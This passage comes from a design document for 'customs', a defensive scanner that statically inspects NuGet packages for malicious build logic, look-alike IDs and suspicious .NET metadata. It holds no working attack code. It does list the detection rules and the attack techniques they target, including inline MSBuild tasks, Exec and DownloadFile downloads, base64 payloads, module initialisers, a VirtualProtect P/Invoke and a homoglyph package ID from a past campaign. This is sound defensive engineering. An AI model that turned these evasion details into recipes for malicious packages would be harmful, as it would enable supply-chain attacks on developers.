customs scans every `.props`, `.targets` and `.tasks` file in the package, not only the entry points `build/<id>.props` and `build/<id>.targets`, because an entry point can import any other file. It then marks which files are reachable from an entry point through `Import` elements with literal paths relative to `$(MSBuildThisFileDirectory)`. An import it cannot resolve is C207. A finding in a file that no entry point reaches is still reported, with a note that the file is not imported by a known path; an attacker can import it through a property.

A test pins the reason: a package whose entry point imports `tasks/a.targets`, which holds the inline task. A version of the scanner that only reads entry points misses it, and the must-catch test fails.

How M2 does this, after reading MSBuild's source on 2026-11-22:

- **Entry points** are `<id>.props` and `<id>.targets` directly in `build/`, `buildTransitive/`, `buildMultitargeting/` or `buildCrossTargeting/`, or one folder below (a target framework folder), the ID matched ignoring case.
- **Imports.** A `Project` path is resolved when it is literal, optionally starting with `$(MSBuildThisFileDirectory)`, relative to the importing file's folder, as MSBuild resolves relative imports. `\` is read as `/`, and the target is matched ignoring case. Anything with another property, an item or metadata reference, a wildcard or an absolute path, and anything that leaves the package, is C207. Reachability is a breadth-first walk with a visited set, so cycles end. Each file keeps the set of package files its imports reach, without repeats.
- **Which files are read.** Every `.props`, `.targets` and `.tasks` file, wherever it is, and every file of any name that an import reaches from them: MSBuild imports `tasks/payload.xml` or a file with no extension as readily as a `.targets` file. A reached file that is not XML is C004.
- **Element names.** MSBuild's `ProjectParser` matches schema elements such as `Import`, `UsingTask` and `Target` by exact name (`src/Build/Evaluation/ProjectParser.cs`), and its `TaskRegistry` looks task names up with `OrdinalIgnoreCase` (`src/Build/Instance/TaskRegistry.cs`). So customs matches `Import`, `UsingTask` and `Target` by exact local name, whatever the namespace, and `Exec` and `DownloadFile` ignoring case. The brief for M2 assumed every element name is case-sensitive; for task names that was wrong, and an `<EXEC>` would have passed.
- **Encodings and DTDs.** MSBuild reads with `DtdProcessing.Ignore`, detects UTF-8 and UTF-16 from the byte order mark, and honours an encoding named in the XML declaration, with the code page provider registered (`src/Build/Xml/XmlReaderExtension.cs`). So a file with a DTD or in another encoding still runs, and customs still reads it: it blanks out a DTD in the prolog, keeping line breaks (text that looks like a DTD later in the file, in a comment or a value, is left alone, so it cannot blank out the rest), and reads a declared single-byte encoding byte by byte, which keeps every ASCII construct in place. Such a file is C004 and is also scanned by every other rule. UTF-16 without a byte order mark is recognised from `<` followed by a zero byte. A file that is not well-formed XML is C004 and nothing else; MSBuild would not load it either.
- **Limits and time.** At most 8 MiB is read from one MSBuild file and at most 200,000 XML nodes are parsed; over either is a C002 gap for that file. roxmltree walks the tree without recursion. Line numbers come from one table of line starts per file, looked up by binary search, and URLs from one pass over each text, so the work is linear in the input. A first version looked lines up from the start of the document for every node; the M2 review measured 81 seconds for 100,000 nodes on one line.

### Reading ECMA-335 metadata

The module initialiser check needs the `TypeDef` and `MethodDef` tables, P/Invokes need `ImplMap` and `ModuleRef`, and obfuscator markers need `TypeDef`, `TypeRef` and `CustomAttribute`. The tables are stored back to back, and each row size depends on heap size flags and on the row counts of other tables, so a reader has to know the schema of every table up to the last one it reads. customs implements that reader itself, about the size of the ECMA-335 partition II chapter 22 schema, rather than depending on a full .NET analysis crate. See [ADR 0002](adr/0002-own-metadata-reader.md).

The module initialiser is the type initialiser of the `<Module>` type ([ECMA-335 augments](https://github.com/dotnet/runtime/blob/main/docs/design/specs/Ecma-335-Augments.md)), which is the first row of `TypeDef`. customs looks in that row's method range for a method named `.cctor` with the `RTSpecialName` flag, and reads the method header to report the body size.

Correctness is checked against a reference implementation, `System.Reflection.Metadata`. A small C# program in `tools/metadata-oracle/` prints, for each assembly, the row count of every table, whether `<Module>` has a `.cctor`, and every `ImplMap` entry. Its output for the fixture assemblies and for every assembly in the benign corpus is committed as JSON. The tests compare customs against it. The .NET SDK is needed only to regenerate those files, not to build or test customs.

How M3 does this:

- **PE headers** through `object` with its `unaligned` feature, so headers at any offset are read as Windows reads them. A PE file with no CLI directory (both its address and size zero) is native code. Otherwise the sections must be in ascending order of address, must not overlap, and must each have their raw data inside the file, or the assembly is C304 (ADR 0006): that way `object` and `System.Reflection.Metadata` map every address to the same section. The 72-byte CLI header and the metadata must lie inside a section of the file.
- **The metadata root and streams.** The root must start with `BSJB`; every stream must lie inside the metadata. `#~` and `#Strings` are read. Two streams of one name, a `#-` stream, pointer or edit-and-continue tables in `#~`, the delta flag and table bits above 0x2C are refused as C304 (ADR 0006). The "extra data" flag is honoured as both .NET readers honour it.
- **Row sizes.** Every table from 0x00 to 0x2C has its schema in the code, because the offset of each table depends on all before it. String, GUID and blob indexes are four bytes when their heap flag says so; a table index is four bytes when that table has 65,536 rows or more; a coded index is four bytes when any table it can name has 2^(16 - tag bits) rows or more. A row count over 16,777,215 is a C002 gap. The sum of all tables must fit in the `#~` stream before any row is read, so no count sizes an allocation or a loop beyond the bytes that are there; every cell read checks its row against the count and its bytes against the stream again.
- **Names** are compared in place: to ask whether a name is `.cctor` customs reads seven bytes, whatever the heap holds. A name read whole, for a message, stops at 1,024 bytes. So the work is linear in the rows read, also when every row points at one name a megabyte long with no end; a test builds that case with 400,000 rows.
- **The module initialiser.** The method list of `<Module>` runs from its `MethodList` to the next type's, or to the end of `MethodDef` when it is the only type, as `System.Reflection.Metadata` reads it. A list that runs past the table, one that starts past the table or after the next type's, and a list of 0 while the next type's starts later are C304; `System.Reflection.Metadata` reads the last three as empty, but none is a valid encoding (ADR 0006). The body size comes from the tiny or fat method header, and only if the IL fits in its section.
- **P/Invokes** come from every `ImplMap` row; a row with an empty import name, which II.22.22 forbids, is C304 (ADR 0006). **Markers** from the names of every `TypeDef` and `TypeRef` row. `CustomAttribute` is not read: an attribute can only be applied through a type that is in one of those two tables.
- **The oracle.** For the fixtures it prints every import. For the corpus it prints the number of imports of each assembly and a 64-bit FNV-1a hash of them, because the 47,000 imports of the corpus, most of them SkiaSharp's, are 3.7 MB of JSON; the test computes the same hash, so one different import still fails it. `python corpus/corpus.py oracle` regenerates the corpus file and `python tests/fixtures/assemblies/build.py` the fixtures.

### False positives

A tool that flags the legitimate packages that ship build logic gets removed from CI in a week. The project brief named Grpc.Tools and SourceLink as packages with `Exec`. Checked in a local cache on 2026-11-22, Grpc.Tools 2.60.0 and the SourceLink packages there contain no `Exec` at all; Grpc.Tools runs its own task assembly through `UsingTask` (C202). Which legitimate packages trip which rule is therefore measured, not assumed. Three things address it:

1. **A benign corpus.** The 300 most downloaded packages on nuget.org, latest stable versions, pinned in `corpus/benign.txt` with ID, version and SHA-512. A script downloads them into a local directory. A test, ignored by default and run in a weekly CI job and before each detection milestone ends, scans them all. Every finding they produce must be listed in `corpus/benign-expected.txt` with a one-line reason a person wrote. The test fails on a finding that is not listed and on a listed finding that no longer appears. No `error` finding is allowed in the benign corpus.
2. **The baseline**, so that what a team has reviewed stays quiet.
3. **Severities decided by data.** If a rule produces many reviewed, harmless warnings in the corpus, its default drops to note, and that is written in the rule table.

The README of the first release publishes the numbers: how many of the 300 packages produce any finding, by rule.

**The corpus at M3.** Of the 2,762 `.dll` and `.exe` entries in the corpus, 2,714 are managed assemblies and 48 native. No assembly has a module initialiser (C301), an obfuscator marker (C303) or a C304. One package has C302: four warnings in `lib/EO.Base.dll` of EO.WebBrowser, reviewed in `corpus/benign-expected.txt`. Two packages gained a C104 note for a native `.exe` under `tools/`, which M2 could not tell from a managed one: EO.WebBrowser (`tools/eowp.exe`) and Microsoft.Extensions.ApiDescription.Server (`tools/net11.0/GetDocument.Insider.exe`, an app host). The corpus still has no error.

**The corpus at M2.** `python corpus/corpus.py list` on 2026-11-22 asked the search API for `q=` (empty), `prerelease=false`, `semVerLevel=2.0.0`, `sortBy=totalDownloads-desc`, `take=300`, and pinned the latest stable version of each with the SHA-512 of its `.nupkg`. The 300 archives are 849,380,928 bytes. 103 of them hold MSBuild files, 241 files in all. A crude count with regular expressions before the parser existed, and the real scan after, agree:

| Rule | Packages | Findings |
| --- | --- | --- |
| C201 inline task | 0 | 0 |
| C202 task assembly | 8 | 28 |
| C203 `Exec` | 2 | 3 |
| C204 `DownloadFile` | 0 | 0 |
| C205 URL | 1 | 2 |
| C206 base64 | 0 | 0 |
| C207 unresolved import | 3 | 8 |
| C004 encoding, DTD, XML | 0 | 0 |

No rule fires on a large share of the corpus, so no severity changed. The one change the data forced is in C207: imports with an `Sdk` attribute. No package in the corpus holds two entries with the same name, so the duplicate-name C003 stays as it is; six older Microsoft packages in a local cache do, with `packageIcon.png` twice, and the corpus has newer versions of none of them. Every warning is reviewed in `corpus/benign-expected.txt`; the corpus produces no error.

### Look-alike package IDs

The NuGet client accepts IDs that match `^\w+([.-]\w+)*$`, and in .NET `\w` includes non-Latin letters. A newer, optional restricted set allows only ASCII letters, digits, dots, dashes and underscores ([PackageIdValidator.cs](https://github.com/NuGet/NuGet.Client/blob/dev/src/NuGet.Core/NuGet.Packaging/PackageCreation/Utility/PackageIdValidator.cs), read 2026-11-22). The 2024 campaign published `Gսոa.UI3.Wіnfօrms` with Armenian letters. So:

- C401: any non-ASCII character in an ID is an error on its own. No list is needed.
- C402: the Unicode confusable skeleton (UTS #39, through the `unicode-security` crate) of the ID equals the skeleton of a popular ID, and the IDs differ.
- C403: an optimal string alignment distance of 1, or a difference only in `.`, `-` and `_`, to a popular ID that is not the ID itself, on lowercase forms, for IDs of at least 6 characters.

The popular list is the top 4,000 IDs by downloads from the nuget.org search API (the API allows `skip` up to 3,000 and `take` up to 1,000, per [Microsoft Learn](https://learn.microsoft.com/en-us/nuget/api/search-query-service-resource), read 2026-11-22). It is generated by a script, dated, committed as `data/popular-ids.txt` and embedded at compile time. The tool does not fetch it.

Not caught: an ID that extends a popular one (`ZendeskApi.Client.V2`, `StripeApi.Net`). Many legitimate packages extend popular IDs, and flagging them would bury everything else. A test pins that `StripeApi.Net` is not flagged, so the gap stays visible.

A self-test checks the list against itself: no popular ID may flag another popular ID except the pairs reviewed in `data/popular-pairs.txt`.

### Fingerprints

See [ADR 0004](adr/0004-version-free-fingerprints.md). A fingerprint is the first 128 bits of SHA-256 over the rule ID, the lowercase package ID, the path inside the package, and the evidence with whitespace collapsed. The evidence of each rule is defined with the rule: for `Exec` it is the `Command` attribute, for a module initialiser the assembly path and the body size, for a URL the URL. Line numbers and versions are not part of it.

### Checking downloads

A lock file holds a `contentHash` per package and an assets file a `sha512`. For an unsigned package that is the SHA-512 of the `.nupkg`. For a signed package it is not: NuGet hashes the package without its signature ([PackageArchiveReader.GetContentHash](https://github.com/NuGet/NuGet.Client/blob/dev/src/NuGet.Core/NuGet.Packaging/PackageArchiveReader.cs), read 2026-11-22). Checked locally on 2026-11-22: for two signed Microsoft packages the assets `sha512` equals the content hash in `.nupkg.metadata` and differs from the plain SHA-512 in `.nupkg.sha512`; for unsigned packages all three agree. customs implements the signed-package hash in `hash`. The test computes it for every signed package in the local cache and in the benign corpus and compares it with `.nupkg.metadata`. Until that test passes, `diff` does not open a download it cannot verify; it reports C005.

## Testing strategy

| Level | What | Runs |
| --- | --- | --- |
| Unit | Pure functions: version normalisation, path classification, each rule on small inputs, fingerprints, escaping, exit code precedence. | `cargo test`, every OS |
| Golden output | Text, JSON and SARIF for fixture scans compared with committed files. `CUSTOMS_BLESS=1` rewrites them; the diff is reviewed. | `cargo test` |
| Must catch | One test per published technique, building the package in the test from a description: the 2023 inline task in `build/<id>.targets`, the same through an import, in `buildTransitive`, `Exec` with a download, `DownloadFile`, a base64 payload, `tools/init.ps1`, a module initialiser in a library and in an analyzer, a P/Invoke to `VirtualProtect`, an obfuscator marker, the Armenian look-alike ID, a one-edit ID, a separator-only ID. | `cargo test` |
| Must not catch, honestly | The Socket-shaped package (logic in an extension method) and `StripeApi.Net`. The test asserts they produce only inventory notes, so the README's "cannot see" list stays true. | `cargo test` |
| Known-wrong variants | Each detection milestone tries named mutations by hand and records the result in the roadmap: only entry-point files scanned; case-sensitive folder match; `TypeDef` row 2 taken as `<Module>`; heap index width ignored; fingerprint including the version. Each must make a test fail. A mutation that no test catches gets a test. | by hand, recorded |
| Metadata oracle | customs against `System.Reflection.Metadata` on fixture and corpus assemblies. | `cargo test` (committed JSON) |
| Benign corpus | 300 packages, every finding reviewed. | weekly CI job, before each detection milestone ends |
| Properties | Random and mutated bytes into every parser: no panic, memory and time within limits. proptest. | `cargo test`, every OS |
| Fuzzing | cargo-fuzz targets for archive listing, XML rules, PE and metadata, lock and assets parsing. | Linux CI, one minute per target per push; one hour per target before release |

Assembly fixtures are compiled from C# sources in `tests/fixtures/assemblies/src` by `tests/fixtures/assemblies/build.py` and committed as small binaries, with the oracle output next to them. The build is deterministic. They do nothing when loaded; customs never loads them anyway. No live malware is stored anywhere in the repository.

## Platform support

Linux, macOS and Windows, x86_64 and aarch64 where CI has runners. CI tests on all three. Paths inside packages always use `/`; paths on disk use the platform's rules. The global packages folder is `NUGET_PACKAGES` if set, else `~/.nuget/packages`. customs does not read `NuGet.Config`; a custom `globalPackagesFolder` is given with `--packages-dir`, and the assets file names its folders anyway. On Windows, long paths in the cache are opened with the platform's normal API; a path that cannot be opened is a C001 gap.

## Security considerations

- **No execution, no loading.** Nothing from a package is executed, loaded or extracted to disk. Downloads are stored as the `.nupkg` file only.
- **Terminal injection.** Package text (paths, attribute values, IDs) can contain ANSI escape sequences or bidirectional overrides. The text writer escapes every control character, every character in the Unicode `Bidi_Control` set and every non-printing character. A golden test feeds a package with such text and checks the escaped output. JSON and SARIF get their escaping from `serde_json`.
- **Network.** Only `diff` uses the network, only for packages missing locally, only over HTTPS, only to the flat-container base URL, with redirects limited to HTTPS. `--offline` turns it off. Package IDs and versions go to nuget.org, which is what `dotnet restore` does too.
- **Download integrity.** A download is opened only after its hash matches the graph file. The cache is keyed by ID, version and hash.
- **Resource limits.** See [Limits](#limits). Every limit has a test.
- **Self.** `unsafe` is forbidden in the crate. Dependencies are few, permissively licensed and checked by `cargo deny` in CI.

## Decisions

- [ADR 0001](adr/0001-static-reading-only.md): read the resolved graph and package files; never evaluate MSBuild or load assemblies.
- [ADR 0002](adr/0002-own-metadata-reader.md): a minimal ECMA-335 reader of its own instead of dotscope.
- [ADR 0003](adr/0003-rules-in-rust-not-yara.md): rules as Rust code with small data files, not YARA-X.
- [ADR 0004](adr/0004-version-free-fingerprints.md): fingerprints without version and line, with evidence.
- [ADR 0005](adr/0005-read-what-msbuild-imports.md): read the extracted global packages folder when it exists, the archive otherwise.
- [ADR 0006](adr/0006-refuse-ambiguous-metadata.md): refuse metadata that readers could read differently.

## Dependencies

Versions and licences checked on crates.io on 2026-11-22. M1 added `zip`, `serde`, `serde_json` and `lexopt`, and `tempfile` for tests; the others are still planned.

| Crate | Version | Licence | Why |
| --- | --- | --- | --- |
| `zip` | 9.8.1 | MIT | Reading `.nupkg` archives. Only the `deflate-flate2-zlib-rs` feature: the `deflate` feature also pulls in `zopfli`, which only compresses. Other methods are reported as C001 when an entry needs reading. Needs Rust 1.89. Added at M1. |
| `roxmltree` | 0.21.2 | MIT OR Apache-2.0 | MSBuild XML with positions, DTDs off by default, a node limit. Read-only, which is all customs needs. |
| `object` | 0.41.0 | Apache-2.0 OR MIT | PE headers, sections and the CLI data directory. Only `read_core`, `pe` and `unaligned`; it brings `memchr`, which `zip` already uses. Added at M3. ELF and Mach-O are still told apart by their magic numbers, as since M1. |
| `serde`, `serde_json` | 1.0.229, 1.0.154 | MIT OR Apache-2.0 | Lock and assets files, baseline, JSON and SARIF output. `serde_json` with `preserve_order`, because the package folders of an assets file are searched in the order it lists them; that feature uses `indexmap`, which `zip` already brings. Added at M1. |
| `lexopt` | 0.3.2 | MIT | Argument parsing for three commands. Small and without dependencies, unlike clap. Added at M1. |
| `sha2` | 0.11.1 | MIT OR Apache-2.0 | SHA-512 content hashes and SHA-256 fingerprints. Needs Rust 1.88. |
| `unicode-security` | 0.1.3 | MIT/Apache-2.0 | UTS #39 confusable skeletons for C402. |
| `ureq` | 3.5.2 | MIT OR Apache-2.0 | Blocking HTTPS for `diff` downloads, behind the `fetch` feature. No async runtime. |
| `proptest` (dev) | | MIT OR Apache-2.0 | Property tests of the parsers. |
| `tempfile` (dev) | 3.27.0 | MIT OR Apache-2.0 | Test directories with unpredictable names. Added at M1. |

Not planned: `dotscope` (ADR 0002), `yara-x` (ADR 0003), `clap` (more than three commands need), `serde-sarif` (the subset of SARIF needed is small and its last release was 2025-05-09), a string distance crate (optimal string alignment is a few lines).

The minimum Rust version rose from 1.85 to 1.89 when `zip` was added at M1, and the CI MSRV job moved with it.

## Open questions

Things the design depends on that could not be confirmed on 2026-11-22. Each is settled in the milestone that needs it, and the answer is written here.

1. Does nuget.org still accept new package IDs with non-ASCII letters, or does it now apply the restricted ASCII set? C401 is useful either way for older packages, but its weight changes. (M4)
2. Does the lock file's `contentHash` equal the assets file's `sha512` and the `.nupkg.metadata` content hash for signed packages? Assets and metadata agreed on two signed packages; the lock file was not checked. (M5)
3. The exact algorithm for the signed-package content hash, reproduced from NuGet's source and tested against the cache. (M5)
4. Does NuGet match the `build`, `buildTransitive` and `analyzers` folder names case-insensitively on Linux and macOS as on Windows? customs matches case-insensitively either way; the answer decides whether a mismatch deserves its own finding. (M1)

   **Settled at M1, 2026-11-22: yes, on every system.** NuGet picks a package's assets with the patterns of its content model, and a literal part of a pattern, such as `build/`, matches with `string.Compare(..., StringComparison.OrdinalIgnoreCase)` ([`PatternExpression.LiteralSegment.TryMatch` in Parser.cs](https://github.com/NuGet/NuGet.Client/blob/dev/src/NuGet.Core/NuGet.Packaging/ContentModel/Infrastructure/Parser.cs), read 2026-11-22). The comparison does not depend on the operating system. A folder in other case is therefore what NuGet uses, not a mismatch, and gets no finding of its own; the local cache read on 2026-11-22 holds a real package whose folder is `buildtransitive` in lower case. This is read from the source, not seen end to end: a restore of such a package on Linux or macOS was not run. Correction after the M1 review: for these ASCII literals `OrdinalIgnoreCase` is an ASCII case-insensitive comparison, so `buıld/` with a dotless i is not a build folder (`string.Equals("buıld", "BUILD", StringComparison.OrdinalIgnoreCase)` is false on .NET 11). The first M1 version took it for one; customs now compares as NuGet does.
5. Does Visual Studio 2026 still run `tools/init.ps1` for PackageReference projects? The NuGet docs say only that `tools` is on the Package Manager Console's `PATH`. C103 stays a note until this is known. (M2)

   **Settled at M2, 2026-11-22, from NuGet's source, not by running Visual Studio.** Yes for `init.ps1`, no for `install.ps1` and `uninstall.ps1`. After it installs packages into a PackageReference ("build integrated") project, `NuGetPackageManager` calls `BuildIntegratedRestoreUtility.ExecuteInitPs1ScriptsAsync` for the added packages ([NuGetPackageManager.cs](https://github.com/NuGet/NuGet.Client/blob/dev/src/NuGet.Core/NuGet.PackageManagement/NuGetPackageManager.cs), read 2026-11-22), and the Package Manager Console runs `tools/init.ps1` once per package ([ScriptExecutor.cs](https://github.com/NuGet/NuGet.Client/blob/dev/src/NuGet.Clients/NuGet.Console/ScriptExecutor.cs)). The docs say `install.ps1` and `uninstall.ps1` are not run with PackageReference ([Microsoft Learn](https://learn.microsoft.com/en-us/nuget/consume-packages/migrate-packages-config-to-package-reference), read 2026-11-22). All of this happens inside Visual Studio on a developer's machine, not in `dotnet build` on a CI runner, which is the case customs is for. C103 therefore stays a note. In the corpus, 12 packages carry PowerShell scripts: 12 `install.ps1`, 11 `uninstall.ps1`, one `init.ps1` (EntityFramework) and four modules.
6. Where do `zip` and `System.IO.Compression` disagree on malformed archives? (M6)
7. The search API parameter `sortBy=totalDownloads-desc` is not in the documentation. On 2026-11-22 it worked, and the default order without a query was the same for the first five results. The list script records which one it used. (M4)
8. How GitHub code scanning shows SARIF results whose location is a line in a lock file. (M4)
9. The dependency tree of `zip` with only `deflate`, and of `ureq` with its default TLS, under `cargo deny` with this repository's licence list. (M1, M5)

   **The `zip` half, settled at M1, 2026-11-22**, from `cargo tree -e normal --target all` and the licences in `cargo metadata`; `cargo deny` was not installed on the machine, and CI runs it after the push. With `deflate-flate2-zlib-rs`, `zip` 9.8.1 brings `constant_time_eq` 0.6.1 (CC0-1.0 OR MIT-0 OR Apache-2.0), `crc32fast` 1.5.5, `flate2` 1.1.11, `getrandom` 0.4.3, `indexmap` 2.14.2 with `hashbrown` 0.17.2 and `equivalent` 1.0.3, `memchr` 2.8.3 (Unlicense OR MIT), `typed-path` 0.13.0, `zeroize` 1.9.2 with `zeroize_derive` 1.5.0, and `zlib-rs` 0.6.8 (Zlib); on macOS and the BSDs `nix` 0.32.0 (MIT) with `bitflags` and `libc`; on Windows `windows-sys` 0.61.2 and `windows-link`; on wasm32 the `wasm-bindgen` crates and `js-sys`, and `r-efi` 6.0.0 (MIT OR Apache-2.0 OR LGPL-2.1-or-later) for UEFI. `unicode-ident`, through the proc-macro crates, is `(MIT OR Apache-2.0) AND Unicode-3.0`; both parts are in the `deny.toml` list. Every other crate not named with a licence here is MIT OR Apache-2.0. Each licence expression has a choice inside the `deny.toml` list, so the licence check should pass. `cargo deny` warns, without failing, on one duplicate: `syn` 2 for `zeroize_derive` and `syn` 3 for `serde_derive`, both build-time only; `clippy.toml` allows that one duplicate for the same reason.
10. Which obfuscator markers are reliable. Each needs a real sample before it goes into the list. Candidate markers come from public detection code and vendor documentation; customs copies names, not code. (M3)

   **Settled at M3, 2026-11-25: one marker.** Sixteen candidate type names were searched for as bytes in every `.dll` of a local cache of 4,422 package versions: `ConfusedByAttribute` (ConfuserEx), `DotfuscatorAttribute`, `PoweredByAttribute` (SmartAssembly), `BabelObfuscatorAttribute`, `BabelAttribute`, `ObfuscatedByGoliath`, `ProtectedWithCryptoObfuscatorAttribute`, `ProcessedByXenocode`, `YanoAttribute`, `ZYXDNGuarder`, `ObfuscatedByAgileDotNetAttribute`, `ObfuscatedByCliSecureAttribute`, and the strings `NETGuard`, `SecureTeam`, `Eazfuscator` and `DotNetPatcherObfuscatorAttribute`. Only `DotfuscatorAttribute` was there, in two files: `lib/net8.0/Oracle.ManagedDataAccess.dll` of Oracle.ManagedDataAccess.Core 23.9.0 and 23.26.100, where it is a type in the global namespace. customs's own scan of the cache finds exactly those two as C303. The benign corpus has none. So the list holds Dotfuscator alone, and the fixture declares that type by hand. The search also showed the limit of markers: `lib/EO.Base.dll` of EO.WebBrowser, in the corpus, is obfuscated (types named `unur` and `kxmk`) and carries none of them. `System.Reflection.ObfuscationAttribute` is not a marker: it tells an obfuscator what to do and is in many assemblies that were never obfuscated.
11. How large the 300-package benign corpus is to download, and whether it fits in the GitHub Actions cache. (M2)

   **Settled at M2, 2026-11-22.** 849,380,928 bytes for the 300 packages pinned that day (`python corpus/corpus.py fetch` prints the total). GitHub's cache allows 10 GB per repository ([GitHub Docs, dependency caching](https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching), as documented on 2026-11-22), so the weekly job caches the corpus under a key made from the hash of `corpus/benign.txt` and downloads only after the list changes.
12. Do `PackageDownload` items and project SDK packages appear in the assets or lock file? If they do, they are scanned; if not, they stay in "cannot see". (M1)

   **Settled at M1, 2026-11-22.** `PackageDownload` items appear in the assets file, in `project.frameworks.<framework>.downloadDependencies` with an exact range such as `[10.0.15, 10.0.15]`, and not in `libraries` or `targets`. Of 1,880 assets files on a local machine, 179 had them, all runtime packs and compiler packs. They do not appear in the lock file: NuGet builds the lock file from the `targets` of the assets file only ([PackagesLockFileBuilder.cs](https://github.com/NuGet/NuGet.Client/blob/dev/src/NuGet.Core/NuGet.Commands/PackagesLockFileBuilder.cs), read 2026-11-22). So customs scans them from an assets file, as dependency `download`, and they stay in "cannot see" for a lock file. A project SDK package named as `<Project Sdk="Name/Version">` does not appear in either file: in local projects that use such an SDK, the packages it adds as `PackageReference` items are in `libraries`, and the SDK package itself is in none of `libraries`, `targets` and `downloadDependencies`. It stays in "cannot see".
13. How deep an element nesting roxmltree accepts before it fails, and whether that failure is clean. (M6)
14. Does MSBuild accept DTDs and UTF-16 in imported files? If it rejects them, C004 could drop to note, since such a file would break the build. (M2)

   **Settled at M2, 2026-11-22, from MSBuild's source.** It accepts both: project files are read through an `XmlTextReader` with `DtdProcessing = DtdProcessing.Ignore`, a `StreamReader` that detects the byte order mark, and the encoding of the XML declaration, with the code page provider registered so that `windows-1252` and the like work ([XmlReaderExtension.cs](https://github.com/dotnet/msbuild/blob/main/src/Build/Xml/XmlReaderExtension.cs), read 2026-11-22). Such a file runs. C004 stays a warning, because a DTD or an unusual encoding in a package's build file is a way to make it read differently by different tools, and customs reads the file anyway, as MSBuild would.
15. Which package IDs does .NET's `ToLowerInvariant` lowercase differently from customs, character by character? `İ` is one: .NET gives one character, customs keeps it. Such an ID is looked up in the wrong folder and shows as C001. M4 makes every non-ASCII ID an error (C401), so the question is whether anything more is needed. (M4)
